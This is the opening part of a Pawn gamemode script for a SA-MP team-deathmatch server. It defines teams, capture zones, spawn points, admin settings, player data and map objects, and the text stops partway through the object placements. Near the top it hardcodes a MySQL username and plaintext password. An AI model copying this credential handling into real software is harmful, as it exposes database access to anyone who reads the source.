////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include <a_samp>
#include <zcmd>
#include <streamer>
#include <FloodControl>
#include <fuckCleo>
#include <Dini>
#include <Dutils>
#include <lethaldudb2>
#include <SII>
#include <sscanf2>
#include <fixes2>
#include <foreach>
#include <FPS>


//===========================
#define TEAM_PAKISTAN 0
#define TEAM_INDIA 1
#define TEAM_CHINA 2
#define TEAM_USA 3
#define TEAM_NEPAL 4
#define TEAM_NONE 5
#define TEAM_DUBAI 6
#define TEAM_ML 7
#define MAX_TEAMS 9

#define SpamLimit (3000)


#define SNAKE 0  //Snakes farm
#define BAY 1 //Bay side sea shore
#define BIG 2 //Area 69
#define ARMY 3 //army restaurant
#define PETROL 4 //army petrol bunk
#define OIL 5 //oil factory
#define DESERT 6 //gas station
#define QUARRY 7 //Quarry
#define GUEST 8 //Army guest house
#define EAR 9 //Big ear
#define AIRPORT 10 //Airport
#define SHIP 11 //Ship
#define GAS 12 //Gas Station
#define RES 13 //restaurant
//#define NPP 14 //NPP
#define MOTEL 15 //MOTEL
#define HOSPITAL 16 //Hospital
#define BATTLESHIP 17 //BATTLESHIP

//------Classes and class dialogs----
#define SOLDIER 0
#define PILOT 1
#define SNIPER 2
#define ENGINEER 3
#define SUPPORT 4
#define SCOUT 5
#define CLASS_DIALOG 1559
//-----------------------------------

#define TEAM_ZONE_PAKISTAN_COLOR 0x97FF29AA //Green
#define TEAM_ZONE_INDIA_COLOR 0xCED0C9AA// Grey
#define TEAM_ZONE_CHINA_COLOR 0xFF2000AA //Red
#define TEAM_ZONE_USA_COLOR 0x009EFFAA //Blue
#define TEAM_ZONE_NEPAL_COLOR 0xD200FFAA //Purple
#define TEAM_ZONE_DUBAI_COLOR 0xFDE000AA //Yellow
#define TEAM_ZONE_ML_COLOR 0xFD6000AA //Light Red

#define TEAM_PAKISTAN_COLOR 0x97FF29FF //Green
#define TEAM_INDIA_COLOR 0xCED0C9FF// Grey
#define TEAM_CHINA_COLOR 0xFF2000FF //Red
#define TEAM_USA_COLOR 0x009EFFFF //Blue
#define TEAM_NEPAL_COLOR 0xD200FFFF //Purple
#define TEAM_DUBAI_COLOR 0xFDE000FF //Yellow
#define TEAM_ML_COLOR 0xFD6000FF //Light Red

#define COLOR_GREEN      		0x80FF8096
#define COLOR_ROYAL        		0x00C1F6AA
#define COLOR_BROWN	       		0xA52A2AAA
#define COLOR_PURPLE       		0xC2A2DAAA
#define COLOR_ORANGE       		0xFF9900AA
#define lightblue          		0x33CCFFAA
#define cred 				  	"{E10000}"
#define corange					"{FF7E19}"
#define cyellow 				"{FF9E00}"
#define cblue					"{0087FF}"
#define cwhite 					"{FFFFFF}"
#define cgreen 					"{00FF28}"
#define cgrey                   "{969696}"

//===============MySQL DB Connection information================================
#define MYSQL_HOST1 "localhost"
#define MYSQL_USER1 "admin"
#define MYSQL_PASS1 "ug321"
#define MYSQL_DB1 "waw"

//==============================================================================


#if !defined isnull
    #define isnull(%1) \
                ((!(%1[0])) || (((%1[0]) == '\1') && (!(%1[1]))))
#endif

new ID[MAX_PLAYERS];
new AntiSK[MAX_PLAYERS];
new ShipAttack[MAX_PLAYERS];
new rconAttempts[MAX_PLAYERS];
new DND[MAX_PLAYERS];
new LastPm[MAX_PLAYERS];
new FirstSpawn[MAX_PLAYERS];
new Spectating[MAX_PLAYERS];

new Text:Rules;
new Text:StartLogo;
/*new Text:startbox;
new Text:welcome;
new Text:to;
new Text:advance;
new Text:copyright;*/

//==========RANDOM SPAWNS=========================//
new Float:PakistanSpawn[][] =
{
   {-688.0686,928.6783,13.6293},
   {-657.5679, 948.4135, 19.8329},
   {-734.4280,986.2653,12.4784}

};
new Float:IndiaSpawn[][] =
{
   {-772.2545, 1591.2332, 28.3746},
   {-729.4348,1538.6104,40.4290},
   {-799.0009,1551.8523,27.1172}
};
new Float:ChinaSpawn[][] =
{
   {-136.1105,1116.5667,20.1966},
   {-164.6844,1135.0851,19.7422},
   {-122.9220, 1189.2665, 20.8771}
};
new Float:NepalSpawn[][] =
{
   {-1478.6,2616.8,58.799999237061},
   {-1531.18,2536.12,55.700000762939},
   {-1413.17,2613.4,55.799999237061}
};
new Float:USSpawn[][] =
{
   {-250.4555,2595.8433,62.8582},
   {-231.0395,2651.1475,62.8003},
   {-293.5117, 2713.9827, 65.9357}
};
new Float:DubaiSpawn[][] =
{
   {1136.5569, 2228.5549, 16.4153},
   {1075.5007, 2274.7632, 10.7125},
   {1042.0984, 2165.3196, 10.4634}
};
new Float:MLSpawn[][] =
{
   {1162.1560, 1283.3663, 13.6816},
   {1091.5985, 1349.5166, 12.4810},
   {1104.1771, 1247.9479, 12.8267}
};
new Float:CBSpawn[][] =
{
   {-1129.8909, 1057.5424, 1346.4141},
   {-973.1945, 1081.6935, 1344.6327},
   {-1057.6248, 1097.7158, 1342.6323}
};//
new Float:SDMSpawn[][] =
{
   {4117.6572, -1796.2544, 3.5664},
   {4215.4209, -1879.1438, 3.1782},
   {4236.9409, -1774.6536, 2.8831}
};//
new Float:MiniSpawn[][] =
{
   {3156.4609, -5195.8076, 19.4043},
   {3137.2039, -5209.6660, 13.1570},
   {3102.8188, -5140.1558, 35.3608}
};//
//================================================//

#define savefolder "/Users/%s.ini"
#pragma unused ret_memcpy
#pragma dynamic 145000
#pragma tabsize 0


//=======Anti command spam========//
forward PMLog(string[]);

new PlayerColors[200] = {
0xFF8C13FF,0xC715FFFF,0x20B2AAFF,0xDC143CFF,0x6495EDFF,0xf0e68cFF,0x778899FF,0xFF1493FF,0xF4A460FF,
0xEE82EEFF,0xFFD720FF,0x8b4513FF,0x4949A0FF,0x148b8bFF,0x14ff7fFF,0x556b2fFF,0x0FD9FAFF,0x10DC29FF,
0x534081FF,0x0495CDFF,0xEF6CE8FF,0xBD34DAFF,0x247C1BFF,0x0C8E5DFF,0x635B03FF,0xCB7ED3FF,0x65ADEBFF,
0x5C1ACCFF,0xF2F853FF,0x11F891FF,0x7B39AAFF,0x53EB10FF,0x54137DFF,0x275222FF,0xF09F5BFF,0x3D0A4FFF,
0x22F767FF,0xD63034FF,0x9A6980FF,0xDFB935FF,0x3793FAFF,0x90239DFF,0xE9AB2FFF,0xAF2FF3FF,0x057F94FF,
0xB98519FF,0x388EEAFF,0x028151FF,0xA55043FF,0x0DE018FF,0x93AB1CFF,0x95BAF0FF,0x369976FF,0x18F71FFF,
0x4B8987FF,0x491B9EFF,0x829DC7FF,0xBCE635FF,0xCEA6DFFF,0x20D4ADFF,0x2D74FDFF,0x3C1C0DFF,0x12D6D4FF,
0x48C000FF,0x2A51E2FF,0xE3AC12FF,0xFC42A8FF,0x2FC827FF,0x1A30BFFF,0xB740C2FF,0x42ACF5FF,0x2FD9DEFF,
0xFAFB71FF,0x05D1CDFF,0xC471BDFF,0x94436EFF,0xC1F7ECFF,0xCE79EEFF,0xBD1EF2FF,0x93B7E4FF,0x3214AAFF,
0x184D3BFF,0xAE4B99FF,0x7E49D7FF,0x4C436EFF,0xFA24CCFF,0xCE76BEFF,0xA04E0AFF,0x9F945CFF,0xDCDE3DFF,
0x10C9C5FF,0x70524DFF,0x0BE472FF,0x8A2CD7FF,0x6152C2FF,0xCF72A9FF,0xE59338FF,0xEEDC2DFF,0xD8C762FF,
0xD8C762FF,0xFF8C13FF,0xC715FFFF,0x20B2AAFF,0xDC143CFF,0x6495EDFF,0xf0e68cFF,0x778899FF,0xFF1493FF,
0xF4A460FF,0xEE82EEFF,0xFFD720FF,0x8b4513FF,0x4949A0FF,0x148b8bFF,0x14ff7fFF,0x556b2fFF,0x0FD9FAFF,
0x10DC29FF,0x534081FF,0x0495CDFF,0xEF6CE8FF,0xBD34DAFF,0x247C1BFF,0x0C8E5DFF,0x635B03FF,0xCB7ED3FF,
0x65ADEBFF,0x5C1ACCFF,0xF2F853FF,0x11F891FF,0x7B39AAFF,0x53EB10FF,0x54137DFF,0x275222FF,0xF09F5BFF,
0x3D0A4FFF,0x22F767FF,0xD63034FF,0x9A6980FF,0xDFB935FF,0x3793FAFF,0x90239DFF,0xE9AB2FFF,0xAF2FF3FF,
0x057F94FF,0xB98519FF,0x388EEAFF,0x028151FF,0xA55043FF,0x0DE018FF,0x93AB1CFF,0x95BAF0FF,0x369976FF,
0x18F71FFF,0x4B8987FF,0x491B9EFF,0x829DC7FF,0xBCE635FF,0xCEA6DFFF,0x20D4ADFF,0x2D74FDFF,0x3C1C0DFF,
0x12D6D4FF,0x48C000FF,0x2A51E2FF,0xE3AC12FF,0xFC42A8FF,0x2FC827FF,0x1A30BFFF,0xB740C2FF,0x42ACF5FF,
0x2FD9DEFF,0xFAFB71FF,0x05D1CDFF,0xC471BDFF,0x94436EFF,0xC1F7ECFF,0xCE79EEFF,0xBD1EF2FF,0x93B7E4FF,
0x3214AAFF,0x184D3BFF,0xAE4B99FF,0x7E49D7FF,0x4C436EFF,0xFA24CCFF,0xCE76BEFF,0xA04E0AFF,0x9F945CFF,
0xDCDE3DFF,0x10C9C5FF,0x70524DFF,0x0BE472FF,0x8A2CD7FF,0x6152C2FF,0xCF72A9FF,0xE59338FF,0xEEDC2DFF,
0xD8C762FF,0xD8C762FF//taken from wiki
};

//-----------------------------------------------------------------------------------//
//--------
#define USE_MENUS       	// Comment to remove all menus.  Uncomment to enable menus
//#define DISPLAY_CONFIG 	// displays configuration in console window on filterscript load
#define SAVE_LOGS           // Comment if your server runs linux (logs wont be saved)
#define ENABLE_SPEC         // Comment if you are using a spectate system already
#define USE_STATS
#define ANTI_MINIGUN
//#define USE_AREGISTER       // Changes /register, /login etc to  /areister, /alogin etc
//#define HIDE_ADMINS 		// Displays number of admins online instead of level and names
#define ENABLE_FAKE_CMDS   	// Comment to disable /fakechat, /fakedeath, /fakecmd commanads

//-----------------------------------------------------------------------------------//
//===================================Admins Colors=========================================//
#define Color_Server_Owner          0xF60000FF  //Level 6
#define Color_Global_Admin          0xF66E00FF  //Level 5
#define Color_Lead_Admin            0x0000F6FF  //Level 4
#define Color_Senior_Admin          0xF6F600FF  //Level 3
#define Color_Server_Admin          0xF600ABFF  //Level 2
#define Color_Trial_Admin           0x00F6F6FF  //Level 1
#define Color_Helper             0xB5A5F6FF  //Mode
#define Color_RCON_Administrator  	0xF60000FF  //Rcon Admin
//=============================================================================================//
#define MAX_WARNINGS 3     // /warn command

#define MAX_REPORTS 7
#define MAX_CHAT_LINES 7

#define SPAM_MAX_MSGS 5
#define SPAM_TIMELIMIT 8 // SECONDS

#define PING_MAX_EXCEEDS 4
#define PING_TIMELIMIT 60 // SECONDS

#define MAX_FAIL_LOGINS 3
// Admin Area
new AdminArea[6] = {
377, 	// X
170, 	// Y
1008, 	// Z
90,     // Angle
3,      // Interior
0		// Virtual World
};

//Helper
//Anti_warn
new Anti_Warn[MAX_PLAYERS];
new Warn[MAX_PLAYERS];
new Anti_heal[MAX_PLAYERS];
new Anti_Give[MAX_PLAYERS];
//-=Main colours=-//
#define blue 0x375FFFFF
#define red 0xFF0000AA
#define green 0x33FF33AA
#define yellow 0xFFFF00AA
#define grey 0xC0C0C0AA
#define blue1 0x2641FEAA
#define lightblue 0x33CCFFAA
#define orange 0xFF9900AA
#define black 0x2C2727AA
#define COLOR_PINK 0xFF66FFAA
#define COLOR_BLUE 0x0000BBAA
#define COLOR_YELLOW 0xFFFF00AA
#define COLOR_BLACK 0x000000AA
#define COLOR_WHITE 0xFFFFFFAA
#define COLOR_GREEN1 0x33AA33AA
#define COLOR_BROWN 0xA52A2AAA
#define WHITE 0xFFFFFFFF
#define COLOR_BLUE2  0x0015FFAA

new VID[MAX_PLAYERS];

// Caps
#define UpperToLower(%1) for ( new ToLowerChar; ToLowerChar < strlen( %1 ); ToLowerChar ++ ) if ( %1[ ToLowerChar ]> 64 && %1[ ToLowerChar ] < 91 ) %1[ ToLowerChar ] += 32

// Spec
#define ADMIN_SPEC_TYPE_NONE 0
#define ADMIN_SPEC_TYPE_PLAYER 1
#define ADMIN_SPEC_TYPE_VEHICLE 2

// Enums
enum PlayerData
{
	Registered,
	LoggedIn,
	Level,
	Helper,
	Tag,
	dRank,
	Muted,
	Caps,
	Jailed,
	JailTime,
	Frozen,
	FreezeTime,
	Kills,
	Deaths,
	hours,
	mins,
	secs,
	TotalTime,
	ConnectTime,
 	MuteWarnings,
	Warnings,
	Spawned,
	TimesSpawned,
	God,
	GodCar,
	DoorsLocked,
	SpamCount,
	SpamTime,
	PingCount,
	PingTime,
	blip,
	blipS,
	pColour,
	pCar,
	SpecID,
	SpecType,
	OnDuty,
	bool:AllowedIn,
	FailLogin
};
new PlayerInfo[MAX_PLAYERS][PlayerData];
enum ServerData
{
	MaxPing,
	ReadPMs,
	ReadCmds,
	MaxAdminLevel,
	AdminOnlySkins,
	AdminSkin,
	AdminSkin2,
	NameKick,
	PartNameKick,
	AntiSpam,
 	AntiSwear,
 	NoCaps,
	Locked,
	Password[128],
	GiveWeap,
	GiveMoney,
	ConnectMessages,
	AdminCmdMsg,
	AutoLogin,
	MaxMuteWarnings,
	DisableChat,
	MustLogin,
	MustRegister,
};
new ServerInfo[ServerData];

new Float:Pos[MAX_PLAYERS][4];

// duel
new bool:DuelActive;
new Invited[MAX_PLAYERS];
new bool:Dueling[MAX_PLAYERS];
new Duelist[MAX_PLAYERS];
new WinningPrice;

// rcon
new Chat[MAX_CHAT_LINES][128];
new Float:XR,Float:YR,Float:ZR;

//Timers
new BlipTimer[MAX_PLAYERS];
new JailTimer[MAX_PLAYERS];
new FreezeTimer[MAX_PLAYERS];
new LockKickTimer[MAX_PLAYERS];

// Menus
#if defined USE_MENUS
new Menu:LMainMenu, Menu:AdminEnable, Menu:AdminDisable,
    Menu:LVehicles, Menu:twodoor, Menu:fourdoor, Menu:fastcar, Menu:Othercars,
	Menu:bikes, Menu:boats, Menu:planes, Menu:helicopters,
    Menu:XWeapons, Menu:XWeaponsBig, Menu:XWeaponsSmall, Menu:XWeaponsMore,
    Menu:LWeather,Menu:LTime,
    Menu:LTuneMenu, Menu:PaintMenu, Menu:LCars, Menu:LCars2,
    Menu:LTele, Menu:LasVenturasMenu, Menu:LosSantosMenu, Menu:SanFierroMenu,
	Menu:DesertMenu, Menu:FlintMenu, Menu:MountChiliadMenu,	Menu:InteriorsMenu;
#endif

// Forbidden Names & Words
new BadNames[100][100], // Whole Names
    BadNameCount = 0,
	BadPartNames[100][100], // Part of name
    BadPartNameCount = 0,
    ForbiddenWords[100][100],
    ForbiddenWordCount = 0;

// Report
new Reports[MAX_REPORTS][128];

new VehicleNames[212][] = {
	"Landstalker","Bravura","Buffalo","Linerunner","Pereniel","Sentinel","Dumper","Firetruck","Trashmaster","Stretch","Manana","Infernus",
	"Voodoo","Pony","Mule","Cheetah","Ambulance","Leviathan","Moonbeam","Esperanto","Taxi","Washington","Bobcat","Mr Whoopee","BF Injection",
	"Hunter","Premier","Enforcer","Securicar","Banshee","Predator","Bus","Rhino","Barracks","Hotknife","Trailer","Previon","Coach","Cabbie",
	"Stallion","Rumpo","RC Bandit","Romero","Packer","Monster","Admiral","Squalo","Seasparrow","Pizzaboy","Tram","Trailer","Turismo","Speeder",
	"Reefer","Tropic","Flatbed","Yankee","Caddy","Solair","Berkley's RC Van","Skimmer","PCJ-600","Faggio","Freeway","RC Baron","RC Raider",
	"Glendale","Oceanic","Sanchez","Sparrow","Patriot","Quad","Coastguard","Dinghy","Hermes","Sabre","Rustler","ZR3 50","Walton","Regina",
	"Comet","BMX","Burrito","Camper","Marquis","Baggage","Dozer","Maverick","News Chopper","Rancher","FBI Rancher","Virgo","Greenwood",
	"Jetmax","Hotring","Sandking","Blista Compact","Police Maverick","Boxville","Benson","Mesa","RC Goblin","Hotring Racer A","Hotring Racer B",
	"Bloodring Banger","Rancher","Super GT","Elegant","Journey","Bike","Mountain Bike","Beagle","Cropdust","Stunt","Tanker","RoadTrain",
	"Nebula","Majestic","Buccaneer","Shamal","Hydra","FCR-900","NRG-500","HPV1000","Cement Truck","Tow Truck","Fortune","Cadrona","FBI Truck",
	"Willard","Forklift","Tractor","Combine","Feltzer","Remington","Slamvan","Blade","Freight","Streak","Vortex","Vincent","Bullet","Clover",
	"Sadler","Firetruck","Hustler","Intruder","Primo","Cargobob","Tampa","Sunrise","Merit","Utility","Nevada","Yosemite","Windsor","Monster A",
	"Monster B","Uranus","Jester","Sultan","Stratum","Elegy","Raindance","RC Tiger","Flash","Tahoma","Savanna","Bandito","Freight","Trailer",
	"Kart","Mower","Duneride","Sweeper","Broadway","Tornado","AT-400","DFT-30","Huntley","Stafford","BF-400","Newsvan","Tug","Trailer A","Emperor",
	"Wayfarer","Euros","Hotdog","Club","Trailer B","Trailer C","Andromada","Dodo","RC Cam","Launch","Police Car (LSPD)","Police Car (SFPD)",
	"Police Car (LVPD)","Police Ranger","Picador","S.W.A.T. Van","Alpha","Phoenix","Glendale","Sadler","Luggage Trailer A","Luggage Trailer B",
	"Stair Trailer","Boxville","Farm Plow","Utility Trailer"
};
//==============================================================================
#define GREEN      0x80FF8096
#define RED       0xFF6347AA
#define BLUE      0x0015FFAA

#define COL_WHITE "{FFFFFF}"
#define COL_RED "{F81414}"
#define COL_GREEN "{00FF22}"
#define COL_LIGHTBLUE "{00CED1}"

forward Update(playerid);
forward SetZone(playerid);
forward UpdateLabelText(playerid);
forward SaveStats();

new Text3D:RankLabel[MAX_PLAYERS];
new gTeam[MAX_PLAYERS];
new gClass[MAX_PLAYERS];
new GZ_ZONE1; //USA
new GZ_ZONE2; //PAKISTAN
new GZ_ZONE3; //Nepal
new GZ_ZONE4; //CHINA
new GZ_ZONE5; //India
new GZ_ZONE6; //Dubai
new GZ_ZONE7; //Malaysia
new ChinaP;//China
new PP;//Pak
new IP;//India
new NP;//Nepal
new UP;//USA
new DP;//Dubai
new MP;//Malaysia
new	Text:A;
new	Text:S;
new	Text:U;
new	Text:A2;
new Text:Web;
new Text:E;
new Text:Tur;
new Text:ML;
new Streak[MAX_PLAYERS];
new Text:Star[10];
new Text:Rank1[MAX_PLAYERS];
new Text:TeamText[MAX_PLAYERS];

new Text:mbox; //the box
new Text:Message; //the messages textdraw
new MessageStr[170]; //string line 6
new MessageStrl2[170]; //string line 5
new MessageStrl3[170]; //string line 4
new MessageStrl4[170]; //string line 3
new MessageStrl5[170]; //string line 2
new MessageStrl6[170]; //string line 1


/*new Text:tBox;
new Text:Message[15];
new MessageStr[15][128];
*/

new tCP[30];
new UnderAttack[30] = 0;
new CP[30];
new Zone[30];
new Captured[MAX_PLAYERS][30];
new UpdateTimer[MAX_PLAYERS];
new timer[MAX_PLAYERS][30];
new CountVar[MAX_PLAYERS][30];
new Text:CountText[MAX_PLAYERS];
new IsPlayerCapturing[MAX_PLAYERS][30];


new RandomMessages[][] = {
  "{0087FF}[COD]Bot:{FFFFFF} Use {0087FF}/pm <ID> <TEXT> {FFFFFF}To send messages to player",
  "{0087FF}[COD]Bot:{FFFFFF} Call of Duty 8 - Asia at War server updated by {0087FF}Jarnu, xMx4LiFe and Rog",
  "{0087FF}[COD]Bot:{FFFFFF} Read {0087FF}/objective {FFFFFF}to see whats your objective",
  "{0087FF}[COD]Bot:{FFFFFF} Kill all the enemies and capture zone to {0087FF}earn score and rank",
  "{0087FF}[COD]Bot:{FFFFFF} Use {0087FF}/updates {FFFFFF}to check the latest version updates of the server",
  "{0087FF}[COD]Bot:{FFFFFF} Need help? use {0087FF}/helpme [text] {FFFFFF}to ask from admins",
  "{0087FF}[COD]Bot:{FFFFFF} Are you new here? use {0087FF}/help /cmds /rules",
  "{0087FF}[COD]Bot:{FFFFFF} See our online admins using {0087FF}/admins & /moderators",
  "{0087FF}[COD]Bot:{FFFFFF} Visit our forum {0087FF}coming soon",
  "{0087FF}[COD]Bot:{FFFFFF} Want to join others dms?{0087FF}/minigundm , /cbdm , /sdm",
  "{0087FF}[COD]Bot:{FFFFFF} Use {0087FF}/st {FFFFFF}to change your team and {0087FF}/sc {FFFFFF}to change your class",
  "{0087FF}[COD]Bot:{FFFFFF} Use {0087FF}/report [id] [reason]",
  "{0087FF}[COD]Bot:{FFFFFF} If you are new here then use {0087FF}/register <PASSWORD> {969696}to save your stats!",
  "{0087FF}[COD]Bot:{FFFFFF} Capture zones to {0087FF}earn score instantly!",
  "{0087FF}[COD]Bot:{FFFFFF} Use {0087FF}/radiostart 1-8 {FFFFFF}to stream music online!"
  };
//==============================================================================
main()
{
	print("\n----------------------------------");
	print(" COD8 - Asia at War ");
	print("----------------------------------\n");
}


public OnGameModeInit()
{
	//==========================================================================
	// Don't use these lines if it's a filterscript
	SetGameModeText("COD8 TDM v1.1");
	
	DuelActive = false;

	//------Capture Zone Fix--------
 	tCP[SNAKE] = TEAM_NONE;
 	tCP[BAY] = TEAM_NONE;
 	tCP[BIG] = TEAM_NONE;
 	tCP[ARMY] = TEAM_NONE;
 	tCP[PETROL] = TEAM_NONE;
 	tCP[OIL] = TEAM_NONE;
 	tCP[DESERT] = TEAM_NONE;
	tCP[QUARRY] = TEAM_NONE;
	tCP[GUEST] = TEAM_NONE;
	tCP[EAR] = TEAM_NONE;
	tCP[AIRPORT] = TEAM_NONE;
	tCP[SHIP] = TEAM_NONE;
	tCP[GAS] = TEAM_NONE;
	tCP[RES] = TEAM_NONE;
	//tCP[NPP] = TEAM_NONE;
	tCP[MOTEL] = TEAM_NONE;
	tCP[BATTLESHIP] = TEAM_NONE;
	tCP[HOSPITAL] = TEAM_NONE;

	UnderAttack[SNAKE] = 0;
	UnderAttack[BAY] = 0;
	UnderAttack[BIG] = 0;
	UnderAttack[ARMY] = 0;
	UnderAttack[PETROL] = 0;
	UnderAttack[OIL] = 0;
	UnderAttack[DESERT] = 0;
	UnderAttack[QUARRY] = 0;
	UnderAttack[GUEST] = 0;
	UnderAttack[EAR] = 0;
	UnderAttack[AIRPORT] = 0;
	UnderAttack[SHIP] = 0;
	UnderAttack[GAS] = 0;
	UnderAttack[RES] = 0;
	//UnderAttack[NPP] = 0;
	UnderAttack[MOTEL] = 0;
	UnderAttack[HOSPITAL] = 0;
	UnderAttack[BATTLESHIP] = 0;

	SetTimer("RandomMessage", 30000, 1);
	SetTimer("CountDown", 1000, 1);
	SetTimer("FPSPing", 1000, 1);

    AddPlayerClass(294,1110.1959,1909.0803,10.8203,5.0747,0,0,0,0,0,0); // PAKISTAN
    AddPlayerClass(125,-794.9099,1610.2480,29.7032,78.7860,0,0,0,0,0,0); // INDIA
    AddPlayerClass(123,-136.0029,1115.9038,20.1966,3.7893,0,0,0,0,0,0); // CHINA
    AddPlayerClass(287,245.0012,1859.0973,14.0840,74.5591,0,0,0,0,0,0); //USA
    AddPlayerClass(174,405.5110,2451.0649,16.5000,0.2366,0,0,0,0,0,0); // Nepal
    AddPlayerClass(108,405.5110,2451.0649,16.5000,0.2366,0,0,0,0,0,0); // Dubai
    AddPlayerClass(115,405.5110,2451.0649,16.5000,0.2366,0,0,0,0,0,0); // Malaysia

//Admin Chill Lounge
CreateDynamicObject(3115, -684.70288, 402.22345, 0.62500,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -663.97601, 402.18030, 0.62500,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -642.88861, 403.21832, 0.60000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -621.84808, 402.39926, 0.60000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -621.65411, 383.49298, 0.67500,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -621.61914, 364.78952, 0.62500,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -642.64423, 364.91574, 0.60000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -663.68158, 364.87885, 0.55000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -684.73401, 364.96375, 0.51974,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -684.71045, 383.60052, 0.57500,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -684.57910, 411.38599, 8.92500,   90.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -663.43652, 411.39017, 8.92500,   90.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -642.50409, 411.39447, 8.92500,   90.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -621.46814, 411.41022, 8.92500,   90.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -610.88599, 401.92361, 7.62811,   0.00000, 270.00000, 0.00000);
CreateDynamicObject(3115, -611.44043, 383.29846, 7.78756,   0.00000, 270.00000, 0.00000);
CreateDynamicObject(3115, -611.38867, 364.65417, 7.78756,   0.00000, 269.99451, 0.00000);
CreateDynamicObject(3115, -621.77606, 355.38281, 8.92500,   270.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -642.78845, 355.30255, 8.92500,   269.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -663.85461, 355.26855, 8.92500,   269.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -684.89301, 355.21216, 8.92500,   269.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -695.47742, 364.62097, 7.78756,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3115, -695.45081, 383.33456, 7.78756,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3115, -695.39893, 402.05692, 7.78756,   0.00000, 90.00000, 0.00000);
CreateDynamicObject(3115, -663.71265, 402.14941, 18.02498,   180.00000, 0.00000, 0.00000);
CreateDynamicObject(3115, -684.79218, 402.15613, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -685.06781, 383.90274, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -684.99176, 366.53082, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -664.39539, 365.17725, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -643.48022, 365.23660, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -622.27643, 365.08517, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -622.13214, 383.85812, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -621.97803, 402.10568, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -643.06799, 402.09378, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(14537, -654.21759, 365.75092, 2.70903,   0.00000, 0.00000, 0.70499);
CreateDynamicObject(18090, -693.83038, 382.68781, 3.34901,   0.00000, 0.00000, 180.39996);
CreateDynamicObject(16151, -669.47388, 410.25653, 1.27920,   0.00000, 0.00000, 89.32501);
CreateDynamicObject(1594, -689.47638, 380.65939, 1.37621,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1594, -690.65015, 384.72470, 1.37907,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1594, -686.98590, 386.64465, 1.37012,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1594, -684.95856, 382.98721, 1.36622,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1594, -687.04944, 378.32782, 1.35164,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(897, -623.19580, 388.68573, 0.89588,   0.00000, 0.00000, 306.40500);
CreateDynamicObject(897, -615.02844, 389.28912, 0.89588,   0.00000, 7.94000, 244.86853);
CreateDynamicObject(897, -623.26129, 383.86044, 0.89588,   0.00000, 7.93762, 244.86328);
CreateDynamicObject(897, -622.53760, 377.82092, 0.89588,   0.00000, 7.93762, 203.17822);
CreateDynamicObject(897, -614.79822, 381.64343, 0.89588,   0.00000, 7.93213, 203.17566);
CreateDynamicObject(897, -616.01648, 378.68219, 0.89588,   0.00000, 7.93213, 256.77063);
CreateDynamicObject(897, -613.19812, 384.19260, 5.39588,   0.00000, 7.92664, 256.76697);
CreateDynamicObject(897, -618.29944, 387.39008, 5.39588,   0.00000, 7.92664, 292.49670);
CreateDynamicObject(897, -616.47546, 381.15070, 5.39588,   0.00000, 7.92114, 238.89978);
CreateDynamicObject(897, -614.53601, 384.32108, 9.64589,   344.12000, 55.55566, 270.65759);
CreateDynamicObject(3865, -624.82397, 384.74698, 7.12725,   0.00000, 0.00000, 270.67505);
CreateDynamicObject(3865, -618.11505, 384.78061, 7.12725,   0.00000, 0.00000, 270.67017);
CreateDynamicObject(9831, -630.81586, 384.96326, 3.96786,   0.00000, 0.00000, 95.28015);
CreateDynamicObject(896, -619.60278, 385.13550, 4.31821,   0.00000, 0.00000, 314.34497);
CreateDynamicObject(11495, -673.77539, 382.97440, 0.77500,   0.00000, 0.00000, 179.54999);
CreateDynamicObject(11495, -663.59912, 393.04724, 0.80000,   0.00000, 0.00000, 90.22455);
CreateDynamicObject(11495, -641.67395, 393.15121, 0.77500,   0.00000, 0.00000, 90.21973);
CreateDynamicObject(11495, -631.52502, 383.07349, 0.82500,   0.00000, 359.50000, 359.15973);
CreateDynamicObject(11495, -641.94116, 373.49606, 0.85000,   0.00000, 359.49463, 269.10022);
CreateDynamicObject(11495, -663.68256, 373.74838, 0.80000,   0.00000, 359.48914, 269.59912);
CreateDynamicObject(3472, -630.48456, 393.88898, 0.43583,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3472, -653.23877, 393.72311, 0.43583,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3472, -674.30859, 393.86636, 0.43583,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3472, -674.49371, 373.09137, 0.43583,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3472, -653.28931, 372.76208, 0.43583,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3472, -631.03741, 372.73206, 0.43583,   0.00000, 0.00000, 0.00000);
